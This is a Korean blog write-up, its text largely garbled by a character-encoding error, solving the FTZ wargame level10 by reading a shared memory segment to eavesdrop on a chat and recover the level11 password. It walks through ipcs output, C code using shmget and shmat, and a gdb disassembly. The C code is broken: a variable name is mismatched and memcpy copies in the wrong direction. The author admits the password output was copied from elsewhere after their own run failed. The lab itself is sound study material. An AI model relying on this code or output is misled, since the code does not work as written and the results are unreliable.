---
title: '[ì‹œìŠ¤í…œ í•´í‚¹] [FTZ] level10 | ê³µìœ  ë©”ëª¨ë¦¬'
author: cotes
date: 2023-02-09 23:35:00 +0900
categories: [Computer Science, System Hacking | Pwnable] 
tags: [study]
math: true
mermaid: true
pin: true
---
# level10 | ê³µìœ  ë©”ëª¨ë¦¬

### **What to Study**

- ê³µìœ  ë©”ëª¨ë¦¬
- IPC
- shmget, shmat, shmdt
- IPC_CREAT | 0666
- ê³µìœ  ë©”ëª¨ë¦¬ì™€ ê´€ë ¨ëœ ëª…ë ¹ì–´ ipcs

### ë¬¸ì œ

```bash
[level10@ftz tmp]$ cat ../hint 

ë‘ëª…ì˜ ì‚¬ìš©ìê°€ ëŒ€í™”ë°©ì„ ì´ìš©í•˜ì—¬ ë¹„ë°€ìŠ¤ëŸ° ëŒ€í™”ë¥¼ ë‚˜ëˆ„ê³  ìˆë‹¤.
ê·¸ ëŒ€í™”ë°©ì€ ê³µìœ  ë©”ëª¨ë¦¬ë¥¼ ì´ìš©í•˜ì—¬ ë§Œë“¤ì–´ì¡Œìœ¼ë©°, 
key_tì˜ ê°’ì€ 7530ì´ë‹¤. ì´ë¥¼ ì´ìš©í•´ ë‘ ì‚¬ëŒì˜ ëŒ€í™”ë¥¼ ë„ì²­í•˜ì—¬ 
level11ì˜ ê¶Œí•œì„ ì–»ì–´ë¼.

- ë ˆë²¨ì„ ì™„ë£Œí•˜ì…¨ë‹¤ë©´ ì†ŒìŠ¤ëŠ” ì§€ìš°ê³  ë‚˜ê°€ì£¼ì„¸ìš”.
```

### ê³µìœ  ë©”ëª¨ë¦¬ë€?

![Untitled](level10%20%E1%84%80%E1%85%A9%E1%86%BC%E1%84%8B%E1%85%B2%20%E1%84%86%E1%85%A6%E1%84%86%E1%85%A9%E1%84%85%E1%85%B5%20ed141181fb5c4159b41f4f0df76bc0bc/Untitled.png)

### ë¬¸ì œ ë¶„ì„

```bash
[level10@ftz level10]$ find / -user level10 2>/dev/null
# ????  ê´€ë ¨ ë‚´ìš© ì ‘ê·¼ ë¶ˆê°€ ë˜ëŠ” ì—†ìŒ 

[level10@ftz level10]$ ls -al # ì‹¤í–‰ ë‚´ì—­ í™•ì¸
total 84
drwxr-xr-x    5 root     level10      4096 Jan 14  2010 ./
drwxr-xr-x   34 root     root         4096 Sep 10  2011 ../
-rw-------    1 root     root            1 Jan 15  2010 .bash_history
-rw-r--r--    1 root     root           24 Feb 24  2002 .bash_logout
-rw-r--r--    1 root     root          224 Feb 24  2002 .bash_profile
-rw-r--r--    1 root     root          151 Feb 24  2002 .bashrc
-rw-r--r--    1 root     root          400 Sep 24  2000 .cshrc
-rw-r--r--    1 root     root         4742 Sep 24  2000 .emacs
-r--r--r--    1 root     root          319 Sep 24  2000 .gtkrc
-rw-r--r--    1 root     root          100 Sep 24  2000 .gvimrc
-rw-r-----    1 root     level10       253 Jan 14  2010 hint
-rw-r--r--    1 root     root          226 Sep 24  2000 .muttrc
-rw-r--r--    1 root     root          367 Sep 24  2000 .profile
drwxr-x---    2 root     root         4096 Mar 29  2003 program/
drwxr-xr-x    2 root     level10      4096 Feb 24  2002 public_html/
drwxrwxr-x    2 root     level10      4096 Feb  9 19:34 tmp/
-rw-------    1 root     root            1 May  7  2002 .viminfo
-rw-r--r--    1 root     root         4145 Sep 24  2000 .vimrc
-rw-r--r--    1 root     root          245 Sep 24  2000 .Xdefaults
```

```bash
[level10@ftz level10]$ cat /etc/rc.d/rc.local // ì‹œì‘ í”„ë¡œê·¸ë¨ 
#!/bin/sh
#
# This script will be executed *after* all the other init scripts.
# You can put your own initialization stuff in here if you don't
# want to do the full Sys V style init stuff.

touch /var/lock/subsys/local

# setting hostname
hostname ftz.hackerschool.org

# run web server
/etc/init.d/httpd start

# open level4 port
cp /bin/ls /home/level4/tmp/backdoor
chown level4.level4 /home/level4/tmp/backdoor
/etc/init.d/xinetd restart
rm -rf /home/level4/tmp/backdoor

# run level10
/home/level10/program/level10 // linux êµ¬ë™ ì‹œ level10 í´ë”ë¡œ 

# get ip
dhclient eth0
```

```bash
[level10@ftz tmp]$ ps -ef | grep level10
level10  30892 30890  0 19:36 ?        00:00:00 [sshd]
level10  30893 30892  0 19:36 pts/0    00:00:00 -bash
level10  30928  1884  0 19:37 tty1     00:00:00 -bash
level10  31011 30893  0 19:48 pts/0    00:00:00 ps -ef
level10  31012 30893  0 19:48 pts/0    00:00:00 grep level10
```

- ê³µìœ  ë©”ëª¨ë¦¬ í™•ì¸

```bash
[level10@ftz tmp]$ ipcs

------ Shared Memory Segments --------
key        shmid      owner      perms      bytes      nattch     status      
0x00001d6a 0          root      666        1028       0                       
0x46532e4f 32769      trainer3  777        5          0                       

------ Semaphore Arrays --------
key        semid      owner      perms      nsems     

------ Message Queues --------
key        msqid      owner      perms      used-bytes   messages
```

```bash
[level10@ftz tmp]$ printf %d 0x00001d6a      
7530
```

- 0x00001d6a  â†’ 7530

- ê³µìœ  ë©”ëª¨ë¦¬ ì ‘ê·¼ ì½”ë“œ ì‘ì„±

```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFSIZE 1024

int main() 
{
        void *sharedMemory = (void *)0;
        int sharedMemId;
        char buf[BUFSIZE];
        key_t keyval = 7530;

				//  BUFSIZE ë§Œí¼ ê³µìœ  ë©”ëª¨ë¦¬ ìƒì„±
        sharedMemID = shmget(keyval, BUFSIZE, IPC_CREAT | 0666);

				// í”„ë¡œì„¸ìŠ¤ì—ì„œ ê³µìœ  ë©”ëª¨ë¦¬ ê³µê°„ì„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ attach í•¨
        sharedMemory = shmat(sharedMemID, (void *)0, 0);

				// ê³µìœ  ë©”ëª¨ë¦¬ ê³µê°„ì— ìˆëŠ” ê°’ì„ bufì— ë³µì‚¬
        memcpy(sharedMemory, buf, BUFSIZE);
        printf("%s", sharedMemory);

				// í”„ë¡œì„¸ìŠ¤ì—ì„œ ê³µìœ  ë©”ëª¨ë¦¬ì˜ ì—°ê²°ì„ ë¶„ë¦¬
        shmdt(sharedMemory);

        return 0;
}
```

- ì»´íŒŒì¼ í›„ ì‹¤í–‰

```c
[level10@ftz tmp]$ gcc -o level10 level10.c
[level10@ftz tmp]$ ./level10
ë©ë©: level11ì˜ íŒ¨ìŠ¤ì›Œë“œëŠ”?
êµ¬íƒ€: what!@#$?
```

( ì°¸ê³ ë¡œ ì´ ê²°ê³¼ëŠ” í¼ì™”ìŠµë‹ˆë‹¤.. ì—´ì‹¬íˆ ë”°ë¼ í–ˆìœ¼ë‚˜.. ëª¨ì¢…ì˜ ì´ìœ ë¡œ.. ê²°ê³¼ê°€ ë‚˜ì˜¤ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.. )

### ê³µìœ  ë©”ëª¨ë¦¬ ê´€ë ¨ í•¨ìˆ˜

```c
int shmget(key_t argument_key, size_t size, int shmflg);

argument_keyì™€ ê´€ë ¨ëœ ê³µìœ  ë©”ëª¨ë¦¬ segmentì˜ idë¥¼ ë°˜í™˜í•œë‹¤.
shmflgì— ë”°ë¼ ì ì ˆí•˜ê²Œ ê°’ì„ ë°˜í™˜í•œë‹¤.

shmflgì˜ ì¢…ë¥˜
- IPC_CREAT : ìƒˆë¡œìš´ ë©”ëª¨ë¦¬ segment ë§Œë“¬. 
              ì°¸ê³ ë¡œ 0666ì€ íŒŒì¼ì˜ ê¸°ë³¸ ê¶Œí•œì„ ì„¤ì •í•œë‹¤.
- IPC_EXCL : ë©”ëª¨ë¦¬ê°€ ì‚¬ìš© ì¤‘ì¸ì§€ í™•ì¸ í›„, ì—†ìœ¼ë©´ IPC_CREATë¥¼ í†µí•´ í• ë‹¹. NULLì²´í¬ì™€ ë¹„ìŠ·í•œ ê°œë…
```

```c
void *shmat(int shmid, const void *shmaddr, int shmflg);

ê³µìœ  ë©”ëª¨ë¦¬ë¥¼ ì–»ì—ˆë‹¤ë©´, shmgetìœ¼ë¡œ ì–»ì€ shmidì— í”„ë¡œì„¸ìŠ¤ë¥¼ attachí•˜ëŠ” ì‹œìŠ¤í…œ ì½œ.
shmaddrê°€ NULL(0)ì¼ ê²½ìš°, ì ì ˆí•œ ì£¼ì†Œ ê°’ì„ ë°˜í™˜.
NULL(0)ì´ ì•„ë‹ ê²½ìš°, ê·¸ ì£¼ì†Œì™€ ê°€ì¥ ê°€ê¹Œìš´ ì£¼ì†Œë¥¼ ë°˜í™˜.
ì—ëŸ¬ ë°œìƒ ì‹œ -1 ë°˜í™˜í•œë‹¤. void *ë¡œ ë°˜í™˜í•œë‹¤.
```

```c
int shmdt(const void *shmaddr);
ê³µìœ  ë©”ëª¨ë¦¬ì™€ í”„ë¡œì„¸ìŠ¤ë¥¼ ë–¼ì–´ë‚¸ë‹¤. shmaddrì—ëŠ” shmatìœ¼ë¡œ ë°›ì€ ì£¼ì†Œë¥¼ ë„£ëŠ”ë‹¤. 
ì„±ê³µ ì‹œ 0, ì‹¤íŒ¨ ì‹œ -1ì„ ë°˜í™˜í•œë‹¤.
```

```c
int shmctl(int shmid, int cmd, struct shmid_ds *buf);
ê³µìœ  ë©”ëª¨ë¦¬ë¥¼ ì œì–´í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•œë‹¤.
ì •ë³´ë¥¼ ì–»ê±°ë‚˜, ì–´ë–¤ ê°’ì„ ì“°ê±°ë‚˜, ê³µìœ  ë©”ëª¨ë¦¬ë¥¼ ì‚­ì œí•˜ëŠ” ë“±ì˜ ì¡°ì‘ì„ ìœ„í•œ í•¨ìˆ˜.

cmd : ê³µìœ  ë©”ëª¨ë¦¬ì— ì‹¤í–‰í•  command
```

```c
struct shmid_ds {
                 struct    ipc_perm shm_perm;  /* operation perms */
                 int  shm_segsz;          /* size of segment (bytes) */
                 time_t    shm_atime;          /* last attach time */
                 time_t    shm_dtime;          /* last detach time */
                 time_t    shm_ctime;          /* last change time */
                 unsigned short shm_cpid; /* pid of creator */
                 unsigned short shm_lpid; /* pid of last operator */
                 short     shm_nattch;         /* no. of current attaches */
            };

```

```c
struct ipc_perm {
              key_t  key;
              ushort uid;   /* owner euid and egid */
              ushort gid;
              ushort cuid;  /* creator euid and egid */
              ushort cgid;
              ushort mode;  /* lower 9 bits of shmflg */
              ushort seq;   /* sequence number */
            };
```

### í”„ë¡œì„¸ìŠ¤ ê°„ í†µì‹   (IPC, Inter Process Communication)

![Untitled](level10%20%E1%84%80%E1%85%A9%E1%86%BC%E1%84%8B%E1%85%B2%20%E1%84%86%E1%85%A6%E1%84%86%E1%85%A9%E1%84%85%E1%85%B5%20ed141181fb5c4159b41f4f0df76bc0bc/Untitled%201.png)

<aside>
ğŸ’¡ í”„ë¡œì„¸ìŠ¤ ê°„ ì„œë¡œ ë°ì´í„°ë¥¼ ì£¼ê³ ë°›ëŠ” í–‰ìœ„, ê·¸ì— ëŒ€í•œ ë°©ë²•ì´ë‚˜ ê²½ë¡œë¥¼ ëœ»í•¨

</aside>

- ì£¼ìš” IPC ë°©ì‹
    - íŒŒì¼
    - ì‹ í˜¸
    - ì†Œì¼“
    - ë©”ì‹œì§€ í
    - íŒŒì´í”„
    - ì§€ëª… íŒŒì´í”„
    - ì„¸ë§ˆ í¬ì–´
    - **ê³µìœ  ë©”ëª¨ë¦¬**
    - ë©”ì‹œì§€ ì „ë‹¬
    - ë©”ëª¨ë¦¬ ë§µ íŒŒì¼
    
    **ğŸ“ [wikipedia | í”„ë¡œì„¸ìŠ¤ ê°„ í†µì‹ ](https://ko.wikipedia.org/wiki/%ED%94%84%EB%A1%9C%EC%84%B8%EC%8A%A4_%EA%B0%84_%ED%86%B5%EC%8B%A0)** ì°¸ê³ 
    

### ASSEMBLY

```bash
(gdb) disas main
Dump of assembler code for function main:
0x080483f8 <main+0>:    push   %ebp
0x080483f9 <main+1>:    mov    %esp,%ebp
0x080483fb <main+3>:    sub    $0x428,%esp
0x08048401 <main+9>:    and    $0xfffffff0,%esp
0x08048404 <main+12>:   mov    $0x0,%eax
0x08048409 <main+17>:   sub    %eax,%esp
0x0804840b <main+19>:   movl   $0x0,0xfffffff4(%ebp)
0x08048412 <main+26>:   movl   $0x1d6a,0xfffffbe4(%ebp)
0x0804841c <main+36>:   sub    $0x4,%esp
0x0804841f <main+39>:   push   $0x3b6
0x08048424 <main+44>:   push   $0x400
0x08048429 <main+49>:   pushl  0xfffffbe4(%ebp)
0x0804842f <main+55>:   call   0x80482e8 <shmget>
0x08048434 <main+60>:   add    $0x10,%esp
0x08048437 <main+63>:   mov    %eax,0xfffffff0(%ebp)
0x0804843a <main+66>:   sub    $0x4,%esp
0x0804843d <main+69>:   push   $0x0
0x0804843f <main+71>:   push   $0x0
0x08048441 <main+73>:   pushl  0xfffffff0(%ebp)
0x08048444 <main+76>:   call   0x8048338 <shmat>
0x08048449 <main+81>:   add    $0x10,%esp
0x0804844c <main+84>:   mov    %eax,0xfffffff4(%ebp)
0x0804844f <main+87>:   sub    $0x4,%esp
0x08048452 <main+90>:   push   $0x400
0x08048457 <main+95>:   lea    0xfffffbe8(%ebp),%eax
0x0804845d <main+101>:  push   %eax
0x0804845e <main+102>:  pushl  0xfffffff4(%ebp)
0x08048461 <main+105>:  call   0x8048328 <memcpy>
0x08048466 <main+110>:  add    $0x10,%esp
0x08048469 <main+113>:  sub    $0x8,%esp
0x0804846c <main+116>:  pushl  0xfffffff4(%ebp)
0x0804846f <main+119>:  push   $0x8048540
0x08048474 <main+124>:  call   0x8048318 <printf>
0x08048479 <main+129>:  add    $0x10,%esp
0x0804847c <main+132>:  sub    $0xc,%esp
0x0804847f <main+135>:  pushl  0xfffffff4(%ebp)
0x08048482 <main+138>:  call   0x80482f8 <shmdt>
0x08048487 <main+143>:  add    $0x10,%esp
0x0804848a <main+146>:  mov    $0x0,%eax
0x0804848f <main+151>:  leave  
0x08048490 <main+152>:  ret    
0x08048491 <main+153>:  nop    
0x08048492 <main+154>:  nop    
0x08048493 <main+155>:  nop
```

- push
    - stackì— data ì €ì¥
    - ì‚¬ìš©ë²•
    
    ```c
    push eax // ìŠ¤íƒì— ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ”ë° ë§ì´ ì“°ì„
    push 20 // ì¦‰ì„ê°’ì¸ 20ì„ stackì— ì €ì¥
    push 401F47 // 
    ```
    
- mov
- sub
- and
- movl
- pushl
- call
- add
- lea
- leave
- ret
